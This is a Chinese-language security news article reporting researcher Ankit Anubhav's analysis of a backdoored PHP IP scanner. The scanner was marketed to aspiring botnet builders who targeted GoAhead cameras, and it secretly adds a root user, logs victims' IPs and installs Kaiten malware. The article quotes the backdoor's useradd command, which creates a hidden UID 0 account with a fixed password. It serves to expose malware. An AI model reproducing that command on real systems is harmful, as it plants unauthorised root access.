准黑客蹭热点不成反遭含后门的IP扫描器愚弄

想要动手创建Reaper僵尸网络的准黑客们前几周被愚弄了一把：下载了一款IP扫描器却不成想其中包含后门。


前段时间爆出由易受攻击路由器和物联网设备组成的僵尸网络Reaper时，黑客们免费下载了一款IP扫描器，即一个PHP文件。Reaper的不同之处在于，其创建者们使用了一个IP扫描器来查找易受攻击的系统，然后通过多种漏洞的利用代码将Reaper恶意软件安装在易受攻击的设备上。这跟最近爆发的物联网僵尸网络如Mirai和Hajime有所不同，后两者通过Telnet和SSH暴力词典攻击入侵不安全的设备。


黑客想蹭Reaper热点


一个聪明的黑客很快发现，随着这个新型僵尸网络的兴起，想要当黑客的人和脚本小子们很快就会查找构建类似僵尸网络的工具。于是他就创建了一个网站，在上面推广一个PHP脚本，声称它能够从名为poop.txt的本地文本文件中读取IP地址、检查这个IP地市是否托管着一个GoAhead网络服务器，并且在名为GoAhead-Filtered.txt中列出了正向结果。



准黑客们对这个脚本很感兴趣，因为它能发现使用GoAhead服务器的设备（通常是IP安全摄像头），其中存在公开的利用代码并且也是Reaper僵尸网络的攻击目标。

几乎没有什么技术知识且未注意这个PHP脚本源代码的脚本小子们并未发现这个脚本的奇怪之处，即这个脚本的大部分内容都由随机字符所混淆。

发现这个诡计的研究人员AnkitAnubhav指出，“在这个案例中，这个脚本通过ROT13、base64加密多次，而且数据也被以gzip格式压缩。”


IP扫描器脚本含有后门可遭远程访问


Anubhav反编译代码后指出，这脚本中包含一个显而易见的后门，任何有经验的编程人员在看到大量混淆源代码之后应该能看出来。

这些代码共包含四个部分。第一部分是完全起作用的IP扫描器。第二个部分运行的是Bash命令，可将新用户添加到 (Linux) 服务器中，也是受害者执行IP扫描器脚本的地方。第三部分在一个远程服务器中记录了受害者的IP地址。第四部分会下载并在IP扫描器执行的服务器上执行Kaiten僵尸网络恶意软件。



从本质上来讲，想要创建像Reaper那样的僵尸网络的用户会成为别人的Kaiten僵尸网络。

此外，提供这个脚本的黑客也能够借记录的IP和后门账户 （用户虚拟机，密码Meme123）登录到受感染服务器中。

useradd -o -u 0 -g 0 -M -d /root -s /bin/bash VM; echo -e "Meme123\nMeme123" | passwd VM;

Anubhav还指出，这名黑客能利用这个后门收集包含其他人扫描结果的GoAhead-Filtered.txt文件，并让其它僵尸网络猎手替他干活之后通过这些IP劫持GoAhead摄像头。


东窗事发遭人肉


这整套计划并非特别复杂，而且Anubhav也并非唯一一个发现这个后门的人。其他黑客也发现了这一点并在推特上将其人肉出来。

深入分析这个后门创建者使用的一些ID后显示，这并非他首次公布含有后门的恶意软件或者跟其他黑客在网络掐架。这可能也就解释了为何Anubhav在黑客的名字中找到了一个dox文件。



在本文成稿之时，推广含有后门的PHP脚本的网站已被拿下，不过Anubhav表示这名黑客还在地下黑市继续出售其它脚本。他在地下黑客论坛上为想要设置物联网僵尸网络的人提供支持。

这并非地下黑市提供的首个含有后门的恶意软件。9月份，Zscaler在Cobian RAT恶意软件中发现了一个隐藏的后门，当时在多个地下黑客论坛上出售。

Anubhav已在博客上公布一份详细的技术分析来说明这个后门脚本的更多情况。
